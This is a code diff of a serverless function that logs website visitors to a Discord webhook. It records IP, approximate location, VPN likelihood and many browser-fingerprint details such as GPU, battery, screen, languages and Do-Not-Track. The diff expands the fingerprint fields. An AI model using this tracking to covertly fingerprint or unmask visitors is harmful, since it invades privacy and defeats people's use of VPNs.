@@ -1,6 +1,6 @@
-// api/alert.js
-// Aggregated, readable Discord alerts with VPN score + approx location.
-// Vercel / Node 18+. Uses per-instance in-memory aggregation to prevent spam.
+\// api/alert.js
+// Aggregated, info-dense Discord alerts with VPN score + approx location.
+// Works on Vercel (Node 18). One readable alert per burst.
 
 const dns = require('node:dns').promises;
 
@@ -12,19 +12,14 @@ module.exports = async (req, res) => {
   if (req.method === 'OPTIONS') return res.status(204).end();
 
   const webhook = process.env.DISCORD_WEBHOOK_URL;
-  if (!webhook) {
-    return res
-      .status(500)
-      .send('❌ ERROR: DISCORD_WEBHOOK_URL is NOT set in Vercel Environment Variables');
-  }
+  if (!webhook) return res.status(500).send('❌ ERROR: DISCORD_WEBHOOK_URL is NOT set');
 
-  // ---------------- config ----------------
-  const AGG_WINDOW_MS = 3500;   // collect near-identical hits into one alert
-  const HOLD_MS       = 12000;  // retain entry briefly to avoid bounce alerts
-  const DEBUG_MAX     = 1400;   // chars for JSON debug block
-  const RDNS_TIMEOUT  = 350;    // ms
+  // ---------- config ----------
+  const AGG_WINDOW_MS = 3500;
+  const HOLD_MS = 12000;
+  const DEBUG_MAX = 1400;
+  const RDNS_TIMEOUT = 350;
 
-  // ---------------- helpers ----------------
   if (!global.__ALERT_AGG) global.__ALERT_AGG = new Map();
   const agg = global.__ALERT_AGG;
 
@@ -54,11 +49,6 @@ module.exports = async (req, res) => {
     try { return String.fromCodePoint(...[...cc].map(c=>0x1F1E6 + (c.charCodeAt(0)-65))); } catch { return ''; }
   };
 
-  const cookieGet = (cookieStr='', key) => {
-    const m = (cookieStr||'').match(new RegExp('(?:^|; )'+key+'=([^;]+)'));
-    return m ? decodeURIComponent(m[1]) : null;
-  };
-
   const postDiscord = async (payloads) => {
     for (const p of payloads) {
       const r = await fetch(webhook, {
@@ -77,11 +67,10 @@ module.exports = async (req, res) => {
     }
   };
 
-  // --------------- parse request ---------------
+  // ---------- parse request ----------
   const ua = req.headers['user-agent'] || '';
   const uaParsed = parseUA(ua);
   const ip = (req.headers['x-forwarded-for']||'').split(',')[0]?.trim() || req.socket?.remoteAddress || 'unknown';
-  const q  = req.query || {};
   const refHeader = req.headers['referer'] || 'none';
 
   let body = {};
@@ -98,36 +87,42 @@ module.exports = async (req, res) => {
   const latitude  = req.headers['x-vercel-ip-latitude'] || '';
   const longitude = req.headers['x-vercel-ip-longitude'] || '';
 
-  // Combine client values (use pathname only — no random query noise)
+  // Use pathname only
   const onlyPathname = (s)=>{
     try { return new URL(s, 'https://x.invalid').pathname || '/'; } catch { return (s||'/').split('?')[0]; }
   };
 
   const client = {
-    name: body.name || q.name || req.headers['x-user-name'] || cookieGet(req.headers.cookie,'name') || null,
-    clickId: body.click_id || q.click_id || req.headers['x-click-id'] || null,
-    fpHash: body.fpHash ?? null,
-    browser: body.browser ?? uaParsed.browser,
-    os: body.os ?? uaParsed.os,
-    device: body.device ?? uaParsed.device,
-    language: body.language ?? (req.headers['accept-language']||'').split(',')[0] || 'unknown',
-    timezone: body.timezone ?? q.tz ?? null,
-    gpu: body.gpu ?? null,
-    net: body.net ?? null,
-    hw: body.hw ?? null,
-    screen: body.screen ?? null,
-    battery: body.battery ?? null,
-    color: body.color ?? null,
-    path: onlyPathname(body.path || q.path || req.headers['x-pathname'] || req.url || '/'),
-    ref: body.ref ?? q.ref ?? refHeader ?? 'none'
+    clickId: body.click_id || null,
+    fpHash: body.fpHash || null,
+
+    browser: body.browser || uaParsed.browser,
+    os:      body.os || uaParsed.os,
+    device:  body.device || uaParsed.device,
+
+    language: body.language || (req.headers['accept-language']||'').split(',')[0] || 'unknown',
+    languages: Array.isArray(body.languages) ? body.languages : null,
+    timezone: body.timezone || null,
+    timezoneOffsetMin: body.timezoneOffsetMin ?? null,
+
+    extra: body.extra || null,
+
+    color:  body.color || null,
+    screen: body.screen || null,
+    hw:     body.hw || null,
+    net:    body.net || null,
+    battery:body.battery || null,
+    gpu:    body.gpu || null,
+
+    path: onlyPathname(body.path || req.url || '/'),
+    ref:  body.ref || refHeader || 'none'
   };
 
-  // ---------- VPN / proxy likelihood ----------
+  // ---------- VPN / proxy score ----------
   async function vpnScore() {
     let score = 0;
     const reasons = [];
 
-    // TZ vs country
     if (client.timezone && country) {
       const usTZ = ['America/Los_Angeles','America/Denver','America/Chicago','America/New_York','America/Phoenix','America/Anchorage','Pacific/Honolulu'];
       const tzIsUS = usTZ.includes(client.timezone);
@@ -135,18 +130,15 @@ module.exports = async (req, res) => {
         score += 20; reasons.push('Timezone vs country mismatch');
       }
     }
-    // Language vs country
     if (client.language && country) {
       const lang = client.language.toLowerCase();
       if (country === 'US' && !lang.startsWith('en')) { score += 10; reasons.push('Non-EN language in US'); }
       if (country !== 'US' && lang.startsWith('en') && !['GB','CA','AU','NZ','IE'].includes(country)) { score += 5; reasons.push('English outside EN-dominant country'); }
     }
-    // ASN
     const asnL = (asn||'').toLowerCase();
     const vpnAsnHints = ['m247','ovh','digitalocean','linode','choopa','contabo','hetzner','leaseweb','vultr','azure','amazon','aws','google','gcp','cloudflare','warp','mullvad','proton','surfshark','windscribe','airvpn','privateinternetaccess','hivelocity','nocix','colo'];
     if (asnL && vpnAsnHints.some(k=>asnL.includes(k))) { score += 35; reasons.push(`ASN: ${asn}`); }
 
-    // Reverse DNS (fast)
     let rdns = '';
     try {
       const p = dns.reverse(ip);
@@ -175,12 +167,8 @@ module.exports = async (req, res) => {
     ? `${city ? city + ', ' : ''}${region ? region + ', ' : ''}${country}${flag ? ' ' + flag : ''}`
     : 'Unknown';
 
-  // ---------- aggregation key ----------
-  const key = [
-    ip, client.device||'-', client.browser||'-', client.path||'/',
-    client.name || '-', client.fpHash ? String(client.fpHash).slice(0,12) : '-'
-  ].join('|');
-
+  // ---------- aggregation ----------
+  const key = [ip, client.device||'-', client.browser||'-', client.path||'/', client.fpHash || '-', client.clickId || '-'].join('|');
   const now = Date.now();
   const existing = agg.get(key);
   if (existing) {
@@ -202,23 +190,18 @@ module.exports = async (req, res) => {
     });
   }
 
-  // quick response (non-blocking)
   if (req.method === 'GET') return res.status(200).send('ok');
   res.status(204).end();
 
   async function send(k){
     const item = agg.get(k); if (!item) return;
     const c = item.client;
-
     const first = new Date(item.firstTs).toLocaleString('en-US', { timeZone: 'America/Los_Angeles' });
     const last  = new Date(item.lastTs).toLocaleString('en-US', { timeZone: 'America/Los_Angeles' });
 
-    // discord embed — easy to read, info-dense
     const fields = [
       { name:'Count (deduped)', value:String(item.count), inline:true },
       { name:'When', value:`${first} → ${last}`, inline:false },
-      { name:'Name', value: c.name || '—', inline:true },
-      { name:'Click ID', value: c.clickId || '—', inline:true },
       { name:'VPN/Proxy', value:`${item.vpn.tier} (${item.vpn.score}/100)`, inline:true },
       { name:'VPN hints', value:item.vpn.reasons.length ? item.vpn.reasons.join(' • ') : '—', inline:false },
       { name:'Device / OS / Browser', value:`${c.device} / ${c.os} / ${c.browser}`, inline:false },
@@ -226,16 +209,28 @@ module.exports = async (req, res) => {
       { name:'IP', value: ip, inline:true },
       { name:'Path', value: c.path || '/', inline:true },
       { name:'Referrer', value: c.ref || 'none', inline:true },
-      { name:'Lang / TZ', value: `${c.language} / ${c.timezone || '—'}`, inline:true },
-      { name:'FP Hash', value: c.fpHash ? String(c.fpHash).slice(0,12) : '—', inline:true }
+      { name:'Lang / TZ', value: `${c.language}${c.languages?` (${c.languages.join(', ')})`:''} / ${c.timezone || '—'}`, inline:false },
+      { name:'TZ offset (min)', value: String(c.timezoneOffsetMin ?? '—'), inline:true },
+      { name:'FP Hash', value: c.fpHash || '—', inline:true },
+      { name:'Click ID', value: c.clickId || '—', inline:true }
     ];
 
-    if (c.gpu)     fields.push({ name:'GPU', value: c.gpu.renderer || c.gpu.vendor || safeJson(c.gpu), inline:false });
-    if (c.hw)      fields.push({ name:'Hardware', value:`${c.hw.cores ?? '-'} cores • ${c.hw.memoryGB ?? '-'} GB RAM`, inline:true });
-    if (c.net)     fields.push({ name:'Network', value:`${c.net.type || '-'} • ${c.net.downlink ?? '-'} Mb/s`, inline:true });
-    if (c.screen)  fields.push({ name:'Screen', value:`${c.screen.w}×${c.screen.h} (${c.screen.colorDepth}-bit)`, inline:true });
+    if (c.extra) fields.push({ name:'Platform/Vendor', value:`${c.extra.platform || '-'} / ${c.extra.vendor || '-'}`, inline:true });
+    if (c.extra) fields.push({ name:'Touch/Cookies/DNT', value:`touch=${c.extra.maxTouchPoints||0} • cookies=${c.extra.cookieEnabled?'on':'off'} • dnt=${c.extra.doNotTrack||'n/a'}`, inline:false });
+    if (c.extra && c.extra.userAgentData) fields.push({ name:'UA-CH', value:`${c.extra.userAgentData.platform || '-'} • ${c.extra.userAgentData.mobile?'mobile':'desktop'} • ${ (c.extra.userAgentData.brands||[]).join(', ') }`, inline:false });
+
+    if (c.color) fields.push({ name:'Color/Prefs', value:`${c.color.scheme || '-'} • gamut=${c.color.gamut || '-'} • hdr=${c.color.hdr || '-'} • motion=${c.color.prefersReducedMotion || '-'} • contrast=${c.color.prefersContrast || '-'}`, inline:false });
+
+    if (c.screen) fields.push({ name:'Screen', value:`${c.screen.w}×${c.screen.h} (${c.screen.colorDepth}-bit) • dpr=${c.screen.dpr} • avail=${c.screen.availW}×${c.screen.availH} • inner=${c.screen.innerW}×${c.screen.innerH}`, inline:false });
+
+    if (c.hw) fields.push({ name:'Hardware', value:`${c.hw.cores ?? '-'} cores • ${c.hw.memoryGB ?? '-'} GB RAM`, inline:true });
+    if (c.net) fields.push({ name:'Network', value:`${c.net.type || '-'} • ${c.net.downlink ?? '-'} Mb/s`, inline:true });
+
     if (c.battery) fields.push({ name:'Battery', value:`${Math.round((c.battery.level ?? 0)*100)}% • ${c.battery.charging ? '⚡ charging' : 'idle'}`, inline:true });
-    if (c.color)   fields.push({ name:'Color Mode', value:c.color.scheme || '-', inline:true });
+
+    if (c.gpu) fields.push({ name:'GPU', value:`${c.gpu.renderer || c.gpu.vendor || '-'} • maxTex=${c.gpu.maxTextureSize || '-'} • exts=${Array.isArray(c.gpu.extensions)?c.gpu.extensions.join(', '):'-'}`, inline:false });
+
+    // geo tech details
     if (item.vpn.rdns) fields.push({ name:'rDNS', value:item.vpn.rdns, inline:false });
     if (item.vpn.asn)  fields.push({ name:'ASN',  value:String(item.vpn.asn), inline:false });
 
